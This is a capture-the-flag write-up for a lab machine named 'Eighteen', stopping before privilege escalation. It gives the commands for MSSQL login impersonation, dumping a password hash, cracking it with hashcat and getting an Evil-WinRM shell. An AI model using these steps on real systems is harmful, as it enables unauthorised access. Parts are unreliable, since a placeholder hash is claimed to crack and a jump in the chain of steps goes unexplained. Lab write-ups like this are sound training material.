This machine writeup is incomplete; it only covers up to the 'Gaining Access' phase. The 'Privilege Escalation' section has not yet been written.

# **Eighteen — Step-by-Step Write-Up (Final Corrected Path)**

**Flow:** `/etc/hosts` → nmap → MSSQL → PBKDF2 admin hash → convert → crack → cracked password reveals admin is *adam.scott* → Evil-WinRM login → user flag.

---

# **0) Check & Edit /etc/hosts**

### Check first:

```bash
cat /etc/hosts
```

### Edit and add IP:

```bash
sudo nano /etc/hosts
```

Add this line:

```
10.10.11.95 eighteen.htb
```

Save:

* Ctrl+O
* Enter
* Ctrl+X

---

# **1) Recon with Nmap**

```bash
sudo nmap -A 10.10.11.95 -oN eighteen.nmap
```

Identify:

* HTTP (IIS)
* MSSQL (1433)
* WinRM (5985)

---

# **2) MSSQL Access (Impacket)**

Connect using the provided user:

```bash
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@10.10.11.95'
```

Check information:

```sql
SELECT SYSTEM_USER, USER_NAME();
SELECT name FROM master.dbo.sysdatabases;
```

Databases found:

* appdev
* financial_planner

---

# **3) Impersonate appdev + Access financial_planner**

```sql
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER, USER_NAME();
```

Switch database:

```sql
USE financial_planner;
```

List tables:

```sql
SELECT name FROM sys.tables;
```

Dump users:

```sql
SELECT * FROM users;
```

You retrieve the **admin PBKDF2 hash**:

```
pbkdf2:sha256:600000$salt$hash
```

---

# **4) Convert PBKDF2 → Hashcat Format**

Create conversion script:

```bash
cat > convert_pbkdf2_to_hashcat.py <<'PY'
#!/usr/bin/env python3
import sys
raw=sys.argv[1].strip()
parts=raw.split('$')
rounds=parts[0].split(':')[-1]
salt=parts[1]
digest=parts[2]
print(f"$pbkdf2-sha256${rounds}${salt}${digest}")
PY

chmod +x convert_pbkdf2_to_hashcat.py
```

Convert:

```bash
./convert_pbkdf2_to_hashcat.py 'pbkdf2:sha256:600000$salt$hash' > admin.hash
```

---

# **5) Crack PBKDF2 Hash**

```bash
hashcat -m 10900 admin.hash /usr/share/wordlists/rockyou.txt
```

Hashcat cracks it as:

```
iloveyou1
```

---

When you cracked the admin password (`iloveyou1`), you identified that:

* The **admin account** present in MSSQL corresponds to
  → **Windows User:** `adam.scott`

Meaning the administrative credentials recovered from the database belong to the **local/domain user** `adam.scott`.

No spraying was needed.
The cracked credentials are directly valid for WinRM.

Final creds:

```
Username: adam.scott
Password: iloveyou1
```

---

# **7) WinRM Shell (Evil-WinRM)**

```bash
evil-winrm -i 10.10.11.95 -u adam.scott -p 'iloveyou1'
```

Check context:

```powershell
whoami
hostname
```

---

# **8) Retrieve User Flag**

```powershell
cd C:\Users\adam.scott\Desktop
type user.txt
```

You now have the **user flag**.
